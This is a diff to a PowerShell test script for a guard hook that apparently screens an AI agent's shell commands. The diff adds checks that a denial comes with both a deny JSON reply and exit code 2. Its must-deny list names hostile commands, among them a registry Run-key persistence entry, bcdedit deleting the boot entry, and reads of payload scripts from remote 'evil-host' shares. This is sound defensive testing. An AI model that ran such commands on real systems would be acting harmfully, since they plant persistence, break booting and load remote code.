@@ -11,10 +11,17 @@
 $ErrorActionPreference = 'Stop'
 $hook = Join-Path (Split-Path -Parent $PSScriptRoot) 'kit\hooks\PreToolUse-Guard.ps1'
 
+# The hook denies on BOTH channels (deny JSON on stdout AND exit code 2) —
+# exit 2 is what blocks under bypassPermissions, the JSON carries the reason.
+# A run that produced one without the other is a contract violation, so the
+# test insists on both.
 function Invoke-Guard([string]$tool, [string]$command) {
     $event = @{ tool_name = $tool; tool_input = @{ command = $command } } | ConvertTo-Json -Compress
-    $out = $event | pwsh -NoProfile -File $hook
-    if ($out -match '"permissionDecision"\s*:\s*"deny"') { return 'deny' }
+    $out = $event | pwsh -NoProfile -File $hook 2>$null
+    $code = $LASTEXITCODE
+    $jsonDeny = ($out -match '"permissionDecision"\s*:\s*"deny"')
+    if ($jsonDeny -and $code -eq 2) { return 'deny' }
+    if ($jsonDeny -or $code -ne 0) { return "inconsistent(json=$jsonDeny,exit=$code)" }
     return 'allow'
 }
 
@@ -29,7 +36,10 @@ $MUST_DENY = @(
     @('PowerShell', 'New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name evil -Value x.exe'),
     @('PowerShell', 'bcdedit /delete {current}'),
     @('PowerShell', 'Get-Content \\10.0.0.5\share\payload.ps1'),
-    @('Bash', 'iex $(cat /tmp/x)')
+    @('Bash', 'iex $(cat /tmp/x)'),
+    @('Bash', 'cat "\\\\evil-host\\share\\payload.ps1"'),                          # escaped UNC inside a Bash command
+    @('Bash', 'cat //evil-host/share/payload.ps1'),                                # Git Bash spelling of a UNC path
+    @('Bash', 'powershell -c "Get-Content \\\\evil-host\\share\\x.ps1"')
 )
 
 $MUST_ALLOW = @(
@@ -45,6 +55,12 @@ $MUST_ALLOW = @(
     @('PowerShell', 'E:\tools\sdio\sdio.exe -script:x.script -autoclose'),
     @('PowerShell', 'Get-Content C:\Windows\Logs\CBS\CBS.log -Tail 50'),
     @('Bash', 'rm -rf /tmp/scratch'),
+    @('Bash', 'powershell -c "Get-Content C:\\Windows\\Logs\\CBS\\CBS.log -Tail 50"'),   # escaped LOCAL path in a Bash command is not UNC
+    @('Bash', 'Get-Content "C:\\Windows\\Logs\\DISM\\dism.log"'),
+    @('Bash', 'cat /c/Windows/Logs/CBS/CBS.log'),
+    @('Bash', 'echo http://example.com/ && ping -n 1 example.com'),                # a URL is not a //server/share
+    @('PowerShell', 'Get-ChildItem \\?\C:\Windows\Temp'),                          # device path
+    @('PowerShell', 'Get-Item \\.\PhysicalDrive0'),                               # device path
     @('Read', 'anything')             # non-shell tool: guard defers
 )
 
